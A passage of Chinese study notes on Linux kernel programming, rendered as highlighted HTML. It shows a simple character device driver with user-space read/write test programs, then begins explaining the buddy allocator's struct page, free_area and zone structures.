directive-hash">#</span><span class="token directive keyword">include</span> <span class="token string">&lt;linux/wait.h&gt;</span></span><span class="token macro property"><span class="token directive-hash">#</span><span class="token directive keyword">include</span> <span class="token string">&lt;linux/poll.h&gt;</span></span><span class="token macro property"><span class="token directive-hash">#</span><span class="token directive keyword">include</span> <span class="token string">&lt;linux/sched.h&gt;</span></span><span class="token macro property"><span class="token directive-hash">#</span><span class="token directive keyword">include</span> <span class="token string">&lt;linux/slab.h&gt;</span></span><span class="token macro property"><span class="token directive-hash">#</span><span class="token directive keyword">define</span> <span class="token expression"><span class="token function">BUFFER_MAX</span>    <span class="token punctuation">(</span><span class="token number">64</span><span class="token punctuation">)</span></span></span><span class="token macro property"><span class="token directive-hash">#</span><span class="token directive keyword">define</span> <span class="token expression"><span class="token function">OK</span>            <span class="token punctuation">(</span><span class="token number">0</span><span class="token punctuation">)</span></span></span><span class="token macro property"><span class="token directive-hash">#</span><span class="token directive keyword">define</span> <span class="token expression"><span class="token function">ERROR</span>         <span class="token punctuation">(</span><span class="token operator">-</span><span class="token number">1</span><span class="token punctuation">)</span></span></span><span class="token keyword">struct</span> <span class="token class-name">cdev</span> <span class="token operator">*</span>gDev<span class="token punctuation">;</span><span class="token keyword">struct</span> <span class="token class-name">file_operations</span> <span class="token operator">*</span>gFile<span class="token punctuation">;</span>dev_t  devNum<span class="token punctuation">;</span><span class="token keyword">unsigned</span> <span class="token keyword">int</span> subDevNum <span class="token operator">=</span> <span class="token number">1</span><span class="token punctuation">;</span><span class="token keyword">int</span> reg_major  <span class="token operator">=</span>  <span class="token number">232</span><span class="token punctuation">;</span>    <span class="token keyword">int</span> reg_minor <span class="token operator">=</span>   <span class="token number">0</span><span class="token punctuation">;</span><span class="token keyword">char</span> buffer<span class="token punctuation">[</span>BUFFER_MAX<span class="token punctuation">]</span><span class="token punctuation">;</span> <span class="token comment">//在内核空间中</span><span class="token keyword">int</span> <span class="token function">hello_open</span><span class="token punctuation">(</span><span class="token keyword">struct</span> <span class="token class-name">inode</span> <span class="token operator">*</span>p<span class="token punctuation">,</span> <span class="token keyword">struct</span> <span class="token class-name">file</span> <span class="token operator">*</span>f<span class="token punctuation">)</span><span class="token punctuation">{</span>    <span class="token function">printk</span><span class="token punctuation">(</span>KERN_INFO <span class="token string">"hello_open\n"</span><span class="token punctuation">)</span><span class="token punctuation">;</span>    <span class="token keyword">return</span> <span class="token number">0</span><span class="token punctuation">;</span><span class="token punctuation">}</span><span class="token comment">// u是用户空间的一个地址</span>ssize_t <span class="token function">hello_write</span><span class="token punctuation">(</span><span class="token keyword">struct</span> <span class="token class-name">file</span> <span class="token operator">*</span>f<span class="token punctuation">,</span> <span class="token keyword">const</span> <span class="token keyword">char</span> __user <span class="token operator">*</span>u<span class="token punctuation">,</span> size_t s<span class="token punctuation">,</span> loff_t <span class="token operator">*</span>l<span class="token punctuation">)</span><span class="token punctuation">{</span><span class="token comment">// printk(KERN_INFO "hello_write\n");</span><span class="token keyword">int</span> writelen <span class="token operator">=</span> <span class="token number">0</span><span class="token punctuation">;</span>    writelen <span class="token operator">=</span> BUFFER_MAX<span class="token operator">&gt;</span>s <span class="token operator">?</span> s <span class="token operator">:</span> BUFFER_MAX<span class="token punctuation">;</span> <span class="token comment">//防止越界</span>    <span class="token keyword">if</span> <span class="token punctuation">(</span><span class="token function">copy_from_user</span><span class="token punctuation">(</span>buffer<span class="token punctuation">,</span> u<span class="token punctuation">,</span> writelen<span class="token punctuation">)</span><span class="token punctuation">)</span> <span class="token punctuation">{</span> <span class="token comment">//copy_from_user实现数据拷贝</span><span class="token keyword">return</span> <span class="token operator">-</span>EFAULT<span class="token punctuation">;</span><span class="token punctuation">}</span><span class="token keyword">return</span> writelen<span class="token punctuation">;</span> <span class="token comment">//返回拷贝成功字节数</span><span class="token punctuation">}</span>ssize_t <span class="token function">hello_read</span><span class="token punctuation">(</span><span class="token keyword">struct</span> <span class="token class-name">file</span> <span class="token operator">*</span>f<span class="token punctuation">,</span> <span class="token keyword">char</span> __user <span class="token operator">*</span>u<span class="token punctuation">,</span> size_t s<span class="token punctuation">,</span> loff_t <span class="token operator">*</span>l<span class="token punctuation">)</span><span class="token punctuation">{</span><span class="token comment">// printk(KERN_INFO "hello_read\n");</span>    <span class="token keyword">int</span> readlen<span class="token punctuation">;</span>    readlen <span class="token operator">=</span> BUFFER_MAX<span class="token operator">&gt;</span>s <span class="token operator">?</span> s <span class="token operator">:</span> BUFFER_MAX<span class="token punctuation">;</span>    <span class="token keyword">if</span> <span class="token punctuation">(</span><span class="token function">copy_to_user</span><span class="token punctuation">(</span>u<span class="token punctuation">,</span> buffer<span class="token punctuation">,</span> readlen<span class="token punctuation">)</span><span class="token punctuation">)</span> <span class="token punctuation">{</span> <span class="token comment">//copy_to_user把内核空间的数据拷贝给用户空间</span>    <span class="token keyword">return</span> <span class="token operator">-</span>EFAULT<span class="token punctuation">;</span><span class="token punctuation">}</span>    <span class="token keyword">return</span> readlen<span class="token punctuation">;</span><span class="token punctuation">}</span><span class="token keyword">int</span> <span class="token function">hello_init</span><span class="token punctuation">(</span><span class="token keyword">void</span><span class="token punctuation">)</span><span class="token punctuation">{</span>    devNum <span class="token operator">=</span> <span class="token function">MKDEV</span><span class="token punctuation">(</span>reg_major<span class="token punctuation">,</span> reg_minor<span class="token punctuation">)</span><span class="token punctuation">;</span>    <span class="token keyword">if</span><span class="token punctuation">(</span>OK <span class="token operator">==</span> <span class="token function">register_chrdev_region</span><span class="token punctuation">(</span>devNum<span class="token punctuation">,</span> subDevNum<span class="token punctuation">,</span> <span class="token string">"helloworld"</span><span class="token punctuation">)</span><span class="token punctuation">)</span><span class="token punctuation">{</span>        <span class="token function">printk</span><span class="token punctuation">(</span>KERN_INFO <span class="token string">"register_chrdev_region ok \n"</span><span class="token punctuation">)</span><span class="token punctuation">;</span>     <span class="token punctuation">}</span><span class="token keyword">else</span> <span class="token punctuation">{</span>    <span class="token function">printk</span><span class="token punctuation">(</span>KERN_INFO <span class="token string">"register_chrdev_region error n"</span><span class="token punctuation">)</span><span class="token punctuation">;</span>        <span class="token keyword">return</span> ERROR<span class="token punctuation">;</span>    <span class="token punctuation">}</span>    <span class="token function">printk</span><span class="token punctuation">(</span>KERN_INFO <span class="token string">" hello driver init \n"</span><span class="token punctuation">)</span><span class="token punctuation">;</span>    gDev <span class="token operator">=</span> <span class="token function">kmalloc</span><span class="token punctuation">(</span><span class="token keyword">sizeof</span><span class="token punctuation">(</span><span class="token keyword">struct</span> <span class="token class-name">cdev</span><span class="token punctuation">)</span><span class="token punctuation">,</span> GFP_KERNEL<span class="token punctuation">)</span><span class="token punctuation">;</span>    gFile <span class="token operator">=</span> <span class="token function">kmalloc</span><span class="token punctuation">(</span><span class="token keyword">sizeof</span><span class="token punctuation">(</span><span class="token keyword">struct</span> <span class="token class-name">file_operations</span><span class="token punctuation">)</span><span class="token punctuation">,</span> GFP_KERNEL<span class="token punctuation">)</span><span class="token punctuation">;</span>    gFile<span class="token operator">-&gt;</span>open <span class="token operator">=</span> hello_open<span class="token punctuation">;</span>    gFile<span class="token operator">-&gt;</span>read <span class="token operator">=</span> hello_read<span class="token punctuation">;</span>    gFile<span class="token operator">-&gt;</span>write <span class="token operator">=</span> hello_write<span class="token punctuation">;</span>    gFile<span class="token operator">-&gt;</span>owner <span class="token operator">=</span> THIS_MODULE<span class="token punctuation">;</span>    <span class="token function">cdev_init</span><span class="token punctuation">(</span>gDev<span class="token punctuation">,</span> gFile<span class="token punctuation">)</span><span class="token punctuation">;</span>    <span class="token function">cdev_add</span><span class="token punctuation">(</span>gDev<span class="token punctuation">,</span> devNum<span class="token punctuation">,</span> <span class="token number">1</span><span class="token punctuation">)</span><span class="token punctuation">;</span>    <span class="token keyword">return</span> <span class="token number">0</span><span class="token punctuation">;</span><span class="token punctuation">}</span><span class="token keyword">void</span> __exit <span class="token function">hello_exit</span><span class="token punctuation">(</span><span class="token keyword">void</span><span class="token punctuation">)</span><span class="token punctuation">{</span> <span class="token function">printk</span><span class="token punctuation">(</span>KERN_INFO <span class="token string">" hello driver exit \n"</span><span class="token punctuation">)</span><span class="token punctuation">;</span>    <span class="token function">cdev_del</span><span class="token punctuation">(</span>gDev<span class="token punctuation">)</span><span class="token punctuation">;</span>    <span class="token function">kfree</span><span class="token punctuation">(</span>gFile<span class="token punctuation">)</span><span class="token punctuation">;</span>    <span class="token function">kfree</span><span class="token punctuation">(</span>gDev<span class="token punctuation">)</span><span class="token punctuation">;</span>    <span class="token function">unregister_chrdev_region</span><span class="token punctuation">(</span>devNum<span class="token punctuation">,</span> subDevNum<span class="token punctuation">)</span><span class="token punctuation">;</span>    <span class="token keyword">return</span><span class="token punctuation">;</span><span class="token punctuation">}</span><span class="token function">module_init</span><span class="token punctuation">(</span>hello_init<span class="token punctuation">)</span><span class="token punctuation">;</span><span class="token function">module_exit</span><span class="token punctuation">(</span>hello_exit<span class="token punctuation">)</span><span class="token punctuation">;</span><span class="token function">MODULE_LICENSE</span><span class="token punctuation">(</span><span class="token string">"GPL"</span><span class="token punctuation">)</span><span class="token punctuation">;</span><span aria-hidden="true" class="line-numbers-rows"><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span></span></code></pre><p>Makefile同上</p></li><li><p>测试代码</p><pre class="line-numbers language-c" data-language="c"><code class="language-c"><span class="token macro property"><span class="token directive-hash">#</span><span class="token directive keyword">include</span> <span class="token string">&lt;fcntl.h&gt;</span></span><span class="token macro property"><span class="token directive-hash">#</span><span class="token directive keyword">include</span> <span class="token string">&lt;stdio.h&gt;</span></span><span class="token macro property"><span class="token directive-hash">#</span><span class="token directive keyword">include</span> <span class="token string">&lt;string.h&gt;</span></span><span class="token macro property"><span class="token directive-hash">#</span><span class="token directive keyword">include</span> <span class="token string">&lt;sys/select.h&gt;</span></span><span class="token macro property"><span class="token directive-hash">#</span><span class="token directive keyword">include</span> <span class="token string">&lt;unistd.h&gt;</span></span><span class="token macro property"><span class="token directive-hash">#</span><span class="token directive keyword">define</span> <span class="token expression"><span class="token function">DATA_NUM</span>    <span class="token punctuation">(</span><span class="token number">32</span><span class="token punctuation">)</span></span></span><span class="token keyword">int</span> <span class="token function">main</span><span class="token punctuation">(</span><span class="token keyword">int</span> argc<span class="token punctuation">,</span> <span class="token keyword">char</span> <span class="token operator">*</span>argv<span class="token punctuation">[</span><span class="token punctuation">]</span><span class="token punctuation">)</span><span class="token punctuation">{</span>    <span class="token keyword">int</span> fd<span class="token punctuation">,</span> i<span class="token punctuation">;</span>    <span class="token keyword">int</span> r_len<span class="token punctuation">,</span> w_len<span class="token punctuation">;</span>    fd_set fdset<span class="token punctuation">;</span>    <span class="token keyword">char</span> buf<span class="token punctuation">[</span>DATA_NUM<span class="token punctuation">]</span> <span class="token operator">=</span> <span class="token string">"hello world"</span><span class="token punctuation">;</span>    fd <span class="token operator">=</span> <span class="token function">open</span><span class="token punctuation">(</span><span class="token string">"/dev/hello"</span><span class="token punctuation">,</span> O_RDWR<span class="token punctuation">)</span><span class="token punctuation">;</span>    <span class="token keyword">if</span><span class="token punctuation">(</span><span class="token operator">-</span><span class="token number">1</span> <span class="token operator">==</span> fd<span class="token punctuation">)</span> <span class="token punctuation">{</span>      <span class="token function">perror</span><span class="token punctuation">(</span><span class="token string">"open file error\n"</span><span class="token punctuation">)</span><span class="token punctuation">;</span><span class="token keyword">return</span> <span class="token operator">-</span><span class="token number">1</span><span class="token punctuation">;</span>    <span class="token punctuation">}</span><span class="token keyword">else</span> <span class="token punctuation">{</span><span class="token function">printf</span><span class="token punctuation">(</span><span class="token string">"open success\n"</span><span class="token punctuation">)</span><span class="token punctuation">;</span><span class="token punctuation">}</span>    w_len <span class="token operator">=</span> <span class="token function">write</span><span class="token punctuation">(</span>fd<span class="token punctuation">,</span> buf<span class="token punctuation">,</span> DATA_NUM<span class="token punctuation">)</span><span class="token punctuation">;</span>    <span class="token keyword">if</span><span class="token punctuation">(</span>w_len <span class="token operator">==</span> <span class="token operator">-</span><span class="token number">1</span><span class="token punctuation">)</span> <span class="token punctuation">{</span><span class="token function">perror</span><span class="token punctuation">(</span><span class="token string">"write error\n"</span><span class="token punctuation">)</span><span class="token punctuation">;</span><span class="token keyword">return</span> <span class="token operator">-</span><span class="token number">1</span><span class="token punctuation">;</span><span class="token punctuation">}</span>    <span class="token function">printf</span><span class="token punctuation">(</span><span class="token string">"write len: %d\n"</span><span class="token punctuation">,</span> w_len<span class="token punctuation">)</span><span class="token punctuation">;</span><span class="token function">close</span><span class="token punctuation">(</span>fd<span class="token punctuation">)</span><span class="token punctuation">;</span>    <span class="token keyword">return</span> <span class="token number">0</span><span class="token punctuation">;</span><span class="token punctuation">}</span><span aria-hidden="true" class="line-numbers-rows"><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span></span></code></pre><pre class="line-numbers language-c" data-language="c"><code class="language-c"><span class="token macro property"><span class="token directive-hash">#</span><span class="token directive keyword">include</span> <span class="token string">&lt;fcntl.h&gt;</span></span><span class="token macro property"><span class="token directive-hash">#</span><span class="token directive keyword">include</span> <span class="token string">&lt;stdio.h&gt;</span></span><span class="token macro property"><span class="token directive-hash">#</span><span class="token directive keyword">include</span> <span class="token string">&lt;string.h&gt;</span></span><span class="token macro property"><span class="token directive-hash">#</span><span class="token directive keyword">include</span> <span class="token string">&lt;sys/select.h&gt;</span></span><span class="token macro property"><span class="token directive-hash">#</span><span class="token directive keyword">define</span> <span class="token expression"><span class="token function">DATA_NUM</span>    <span class="token punctuation">(</span><span class="token number">32</span><span class="token punctuation">)</span></span></span><span class="token keyword">int</span> <span class="token function">main</span><span class="token punctuation">(</span><span class="token keyword">int</span> argc<span class="token punctuation">,</span> <span class="token keyword">char</span> <span class="token operator">*</span>argv<span class="token punctuation">[</span><span class="token punctuation">]</span><span class="token punctuation">)</span><span class="token punctuation">{</span>    <span class="token keyword">int</span> fd<span class="token punctuation">,</span> i<span class="token punctuation">;</span>    <span class="token keyword">int</span> r_len<span class="token punctuation">,</span> w_len<span class="token punctuation">;</span>    fd_set fdset<span class="token punctuation">;</span>    <span class="token keyword">char</span> rbuf<span class="token punctuation">[</span>DATA_NUM<span class="token punctuation">]</span><span class="token punctuation">;</span>    <span class="token function">memset</span><span class="token punctuation">(</span>rbuf<span class="token punctuation">,</span><span class="token number">0</span><span class="token punctuation">,</span>DATA_NUM<span class="token punctuation">)</span><span class="token punctuation">;</span>    fd <span class="token operator">=</span> <span class="token function">open</span><span class="token punctuation">(</span><span class="token string">"/dev/hello"</span><span class="token punctuation">,</span> O_RDWR<span class="token punctuation">)</span><span class="token punctuation">;</span>    <span class="token keyword">if</span><span class="token punctuation">(</span><span class="token operator">-</span><span class="token number">1</span> <span class="token operator">==</span> fd<span class="token punctuation">)</span> <span class="token punctuation">{</span>      <span class="token function">perror</span><span class="token punctuation">(</span><span class="token string">"open file error\n"</span><span class="token punctuation">)</span><span class="token punctuation">;</span><span class="token keyword">return</span> <span class="token operator">-</span><span class="token number">1</span><span class="token punctuation">;</span>    <span class="token punctuation">}</span><span class="token keyword">else</span> <span class="token punctuation">{</span><span class="token function">printf</span><span class="token punctuation">(</span><span class="token string">"open successe\n"</span><span class="token punctuation">)</span><span class="token punctuation">;</span><span class="token punctuation">}</span>    r_len <span class="token operator">=</span> <span class="token function">read</span><span class="token punctuation">(</span>fd<span class="token punctuation">,</span> rbuf<span class="token punctuation">,</span> DATA_NUM<span class="token punctuation">)</span><span class="token punctuation">;</span><span class="token keyword">if</span><span class="token punctuation">(</span>r_len <span class="token operator">==</span> <span class="token operator">-</span><span class="token number">1</span><span class="token punctuation">)</span> <span class="token punctuation">{</span><span class="token function">perror</span><span class="token punctuation">(</span><span class="token string">"read error\n"</span><span class="token punctuation">)</span><span class="token punctuation">;</span><span class="token keyword">return</span> <span class="token operator">-</span><span class="token number">1</span><span class="token punctuation">;</span><span class="token punctuation">}</span>    <span class="token function">printf</span><span class="token punctuation">(</span><span class="token string">"read len: %d\n"</span><span class="token punctuation">,</span> r_len<span class="token punctuation">)</span><span class="token punctuation">;</span>    <span class="token function">printf</span><span class="token punctuation">(</span><span class="token string">"%s\n"</span><span class="token punctuation">,</span> rbuf<span class="token punctuation">)</span><span class="token punctuation">;</span><span class="token function">close</span><span class="token punctuation">(</span>fd<span class="token punctuation">)</span><span class="token punctuation">;</span>c    <span class="token keyword">return</span> <span class="token number">0</span><span class="token punctuation">;</span><span class="token punctuation">}</span><span aria-hidden="true" class="line-numbers-rows"><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span></span></code></pre><p><img src="https://raw.githubusercontent.com/night-candle/figurebed/main/img/20211119-test.png" alt=""></p></li></ol><h2 id="05-Linux内存管理">05 | Linux内存管理</h2><ul><li>Linux 中用来<strong>管理物理内存页面</strong>的伙伴系统，以及负责<strong>分配比页更小的内存对象</strong>的SLAB分配器</li></ul><h3 id="伙伴系统">伙伴系统</h3><h4 id="数据结构-2">数据结构</h4><ul><li><p>Linux 使用分页机制管理物理内存，把物理内存分成 4KB 大小的页面进行管理，早期 Linux 使用了位图，后来使用了字节数组，现在 Linux 定义了 <code>struct page</code> 结构体描述每个物理页，内核中一个 page 结构表示一个物理内存页面</p><pre class="line-numbers language-c" data-language="c"><code class="language-c"><span class="token keyword">struct</span> <span class="token class-name">page</span> <span class="token punctuation">{</span>    <span class="token comment">//page结构体的标志，它决定页面是什么状态</span>    <span class="token keyword">unsigned</span> <span class="token keyword">long</span> flags<span class="token punctuation">;</span>    <span class="token keyword">union</span> <span class="token punctuation">{</span>        <span class="token keyword">struct</span> <span class="token punctuation">{</span>            <span class="token comment">//挂载上级结构的链表</span>            <span class="token keyword">struct</span> <span class="token class-name">list_head</span> lru<span class="token punctuation">;</span>            <span class="token comment">//用于文件系统，address_space结构描述上文件占用了哪些内存页面</span>            <span class="token keyword">struct</span> <span class="token class-name">address_space</span> <span class="token operator">*</span>mapping<span class="token punctuation">;</span>            pgoff_t index<span class="token punctuation">;</span>              <span class="token keyword">unsigned</span> <span class="token keyword">long</span> private<span class="token punctuation">;</span>        <span class="token punctuation">}</span><span class="token punctuation">;</span>        <span class="token comment">//DMA设备的地址</span>        <span class="token keyword">struct</span> <span class="token punctuation">{</span>            dma_addr_t dma_addr<span class="token punctuation">;</span>        <span class="token punctuation">}</span><span class="token punctuation">;</span>        <span class="token comment">//当页面用于内存对象时指向相关的数据结构 </span>        <span class="token keyword">struct</span> <span class="token punctuation">{</span>               <span class="token keyword">union</span> <span class="token punctuation">{</span>                <span class="token keyword">struct</span> <span class="token class-name">list_head</span> slab_list<span class="token punctuation">;</span>                <span class="token keyword">struct</span> <span class="token punctuation">{</span>                      <span class="token keyword">struct</span> <span class="token class-name">page</span> <span class="token operator">*</span>next<span class="token punctuation">;</span><span class="token macro property"><span class="token directive-hash">#</span><span class="token directive keyword">ifdef</span> <span class="token expression">CONFIG_64BIT</span></span>                    <span class="token keyword">int</span> pages<span class="token punctuation">;</span>                     <span class="token keyword">int</span> pobjects<span class="token punctuation">;</span><span class="token macro property"><span class="token directive-hash">#</span><span class="token directive keyword">else</span></span>                    <span class="token keyword">short</span> <span class="token keyword">int</span> pages<span class="token punctuation">;</span>                    <span class="token keyword">short</span> <span class="token keyword">int</span> pobjects<span class="token punctuation">;</span><span class="token macro property"><span class="token directive-hash">#</span><span class="token directive keyword">endif</span></span>                <span class="token punctuation">}</span><span class="token punctuation">;</span>            <span class="token punctuation">}</span><span class="token punctuation">;</span>            <span class="token comment">//指向管理SLAB的结构kmem_cache</span>            <span class="token keyword">struct</span> <span class="token class-name">kmem_cache</span> <span class="token operator">*</span>slab_cache<span class="token punctuation">;</span>            <span class="token comment">//指向SLAB的第一个对象</span>            <span class="token keyword">void</span> <span class="token operator">*</span>freelist<span class="token punctuation">;</span>               <span class="token keyword">union</span> <span class="token punctuation">{</span>                <span class="token keyword">void</span> <span class="token operator">*</span>s_mem<span class="token punctuation">;</span>                  <span class="token keyword">unsigned</span> <span class="token keyword">long</span> counters<span class="token punctuation">;</span>                   <span class="token keyword">struct</span> <span class="token punctuation">{</span>                                <span class="token keyword">unsigned</span> inuse<span class="token operator">:</span><span class="token number">16</span><span class="token punctuation">;</span>                    <span class="token keyword">unsigned</span> objects<span class="token operator">:</span><span class="token number">15</span><span class="token punctuation">;</span>                    <span class="token keyword">unsigned</span> frozen<span class="token operator">:</span><span class="token number">1</span><span class="token punctuation">;</span>                <span class="token punctuation">}</span><span class="token punctuation">;</span>            <span class="token punctuation">}</span><span class="token punctuation">;</span>        <span class="token punctuation">}</span><span class="token punctuation">;</span>        <span class="token comment">//用于页表映射相关的字段</span>        <span class="token keyword">struct</span> <span class="token punctuation">{</span>            <span class="token keyword">unsigned</span> <span class="token keyword">long</span> _pt_pad_1<span class="token punctuation">;</span>               pgtable_t pmd_huge_pte<span class="token punctuation">;</span>             <span class="token keyword">unsigned</span> <span class="token keyword">long</span> _pt_pad_2<span class="token punctuation">;</span>            <span class="token keyword">union</span> <span class="token punctuation">{</span>                <span class="token keyword">struct</span> <span class="token class-name">mm_struct</span> <span class="token operator">*</span>pt_mm<span class="token punctuation">;</span>                atomic_t pt_frag_refcount<span class="token punctuation">;</span>            <span class="token punctuation">}</span><span class="token punctuation">;</span>            <span class="token comment">//自旋锁</span><span class="token macro property"><span class="token directive-hash">#</span><span class="token directive keyword">if</span> <span class="token expression">ALLOC_SPLIT_PTLOCKS</span></span>            spinlock_t <span class="token operator">*</span>ptl<span class="token punctuation">;</span><span class="token macro property"><span class="token directive-hash">#</span><span class="token directive keyword">else</span></span>            spinlock_t ptl<span class="token punctuation">;</span><span class="token macro property"><span class="token directive-hash">#</span><span class="token directive keyword">endif</span></span>        <span class="token punctuation">}</span><span class="token punctuation">;</span>        <span class="token comment">//用于设备映射</span>        <span class="token keyword">struct</span> <span class="token punctuation">{</span>            <span class="token keyword">struct</span> <span class="token class-name">dev_pagemap</span> <span class="token operator">*</span>pgmap<span class="token punctuation">;</span>            <span class="token keyword">void</span> <span class="token operator">*</span>zone_device_data<span class="token punctuation">;</span>        <span class="token punctuation">}</span><span class="token punctuation">;</span>        <span class="token keyword">struct</span> <span class="token class-name">rcu_head</span> rcu_head<span class="token punctuation">;</span>    <span class="token punctuation">}</span><span class="token punctuation">;</span>    <span class="token comment">//页面引用计数</span>    atomic_t _refcount<span class="token punctuation">;</span><span class="token macro property"><span class="token directive-hash">#</span><span class="token directive keyword">ifdef</span> <span class="token expression">LAST_CPUPID_NOT_IN_PAGE_FLAGS</span></span>    <span class="token keyword">int</span> _last_cpupid<span class="token punctuation">;</span><span class="token macro property"><span class="token directive-hash">#</span><span class="token directive keyword">endif</span></span><span class="token punctuation">}</span> _struct_page_alignment<span class="token punctuation">;</span><span aria-hidden="true" class="line-numbers-rows"><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span></span></code></pre><blockquote><p>page 结构大量使用了 union 联合体定义结构字段，page 结构会根据不同的状态来使用 union 联合体的变量表示的数据信息</p></blockquote></li><li><p>Linux 内核用 <code>zone</code> 数据结构表示一个区，其中 <code>free_area</code> 结构的数组用于实现伙伴系统，free_area 结构中 list_head 链表数组将具有相同迁移类型的 page 尽可能地分组，同一类型的所有相同 order 的 page 就构成了一组 page 结构块，zone 结构中还有一个指针指向 pglist_data</p><pre class="line-numbers language-c" data-language="c"><code class="language-c"><span class="token keyword">enum</span> <span class="token class-name">migratetype</span> <span class="token punctuation">{</span>    MIGRATE_UNMOVABLE<span class="token punctuation">,</span> <span class="token comment">//不能移动的</span>    MIGRATE_MOVABLE<span class="token punctuation">,</span>   <span class="token comment">//可移动和</span>    MIGRATE_RECLAIMABLE<span class="token punctuation">,</span>    MIGRATE_PCPTYPES<span class="token punctuation">,</span>  <span class="token comment">//属于pcp list的</span>    MIGRATE_HIGHATOMIC <span class="token operator">=</span> MIGRATE_PCPTYPES<span class="token punctuation">,</span><span class="token macro property"><span class="token directive-hash">#</span><span class="token directive keyword">ifdef</span> <span class="token expression">CONFIG_CMA</span></span>    MIGRATE_CMA<span class="token punctuation">,</span>   <span class="token comment">//属于CMA区的</span><span class="token macro property"><span class="token directive-hash">#</span><span class="token directive keyword">endif</span></span><span class="token macro property"><span class="token directive-hash">#</span><span class="token directive keyword">ifdef</span> <span class="token expression">CONFIG_MEMORY_ISOLATION</span></span>    MIGRATE_ISOLATE<span class="token punctuation">,</span>   <span class="token macro property"><span class="token directive-hash">#</span><span class="token directive keyword">endif</span></span>    MIGRATE_TYPES<span class="token punctuation">}</span><span class="token punctuation">;</span><span class="token comment">//页面空闲链表头</span><span class="token keyword">struct</span> <span class="token class-name">free_area</span> <span class="token punctuation">{</span>    <span class="token comment">//数组将具有相同迁移类型的page结构尽可能地分组</span>    <span class="token comment">//分配时会先按请求的migratetype从对应page结构块中寻找，不成功则会从其他migratetype的page结构块中分配</span>    <span class="token keyword">struct</span> <span class="token class-name">list_head</span>    free_list<span class="token punctuation">[</span>MIGRATE_TYPES<span class="token punctuation">]</span><span class="token punctuation">;</span>    <span class="token keyword">unsigned</span> <span class="token keyword">long</span>       nr_free<span class="token punctuation">;</span><span class="token punctuation">}</span><span class="token punctuation">;</span><span class="token keyword">struct</span> <span class="token class-name">zone</span> <span class="token punctuation">{</span>    <span class="token keyword">unsigned</span> <span class="token keyword">long</span> _watermark<span class="token punctuation">[</span>NR_WMARK<span class="token punctuation">]</span><span class="token punctuation">;</span>    <span class="token keyword">unsigned</span> <span class="token keyword">long</span> watermark_boost<span class="token punctuation">;</span>    <span class="token comment">//预留的内存页面数</span>    <span class="token keyword">unsigned</span> <span class="token keyword">long</span> nr_reserved_highatomic<span class="token punctuation">;</span>    <span class="token comment">//内存区属于哪个内存节点 </span><span class="token macro property"><span class="token directive-hash">#</span><span class="token directive keyword">ifdef</span> <span class="token expression">CONFIG_NUMA</span></span>    <span class="token keyword">int</span> node<span class="token punctuation">;</span><span class="token macro property"><span class="token directive-hash">#</span><span class="token directive keyword">endif</span></span>    <span class="token keyword">struct</span> <span class="token class-name">pglist_data</span>  <span class="token operator">*</span>zone_pgdat<span class="token punctuation">;</span>    <span class="token comment">//内存区开始的page结构数组的开始下标 </span>    <span class="token keyword">unsigned</span> <span class="token keyword">long</span>       zone_start_pfn<span class="token punctuation">;</span>        atomic_long_t       managed_pages<span class="token punctuation">;</span>    <span class="token comment">//内存区总的页面数</span>    <span class="token keyword">unsigned</span> <span class="token keyword">long</span>       spanned_pages<span class="token punctuation">;</span>    <span class="token comment">//内存区存在的页面数（一些内存区中存在内存空洞）</span>    <span class="token keyword">unsigned</span> <span class="token keyword">long</span>       present_pages<span class="token punctuation">;</span>    <span class="token comment">//内存区名字</span>    <span class="token keyword">const</span> <span class="token keyword">char</span>      <span class="token operator">*</span>name<span class="token punctuation">;</span>    <span class="token comment">//挂载页面page结构的链表</span>    <span class="token keyword">struct</span> <span class="token class-name">free_area</span>    free_area<span class="token punctuation">[</span>MAX_ORDER<span class="token punctuation">]</span><span class="token punctuation">;</span>    <span class="token comment">//内存区的标志</span>    <span class="token keyword">unsigned</span> <span class="token keyword">long</span>       flags<span class="token punctuation">;</span>    <span class="token comment">/*保护free_area的自旋锁*/</span>    spinlock_t      lock<span class="token punctuation">;</span><span class="token punctuation">}</span><span class="token punctuation">;</span><span aria-hidden="true" class="line-numbers-rows"><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span></span></code></pre><blockquote><p>_watermark：水位，用于控制内存区是否需要进行内存回收</p><p>Linux 内核中也有<strong>区</strong>的逻辑概念，因为硬件的限制，内核不能对所有的物理内存页统一对待，所以就把属性相同物理内存页面，归结到了一个区中，不同硬件平台，区的划分也不一样</p><ul><li><p>32 位 x86 平台中，一些使用 DMA 的设备只能访问 0-16MB 的物理空间，因此将其划分为 ==DMA 区==</p></li><li><p>==高内存区==则适用于要访问的物理地址空间大于虚拟地址空间，Linux 内核不能建立直接映射的情况，64 位 x86 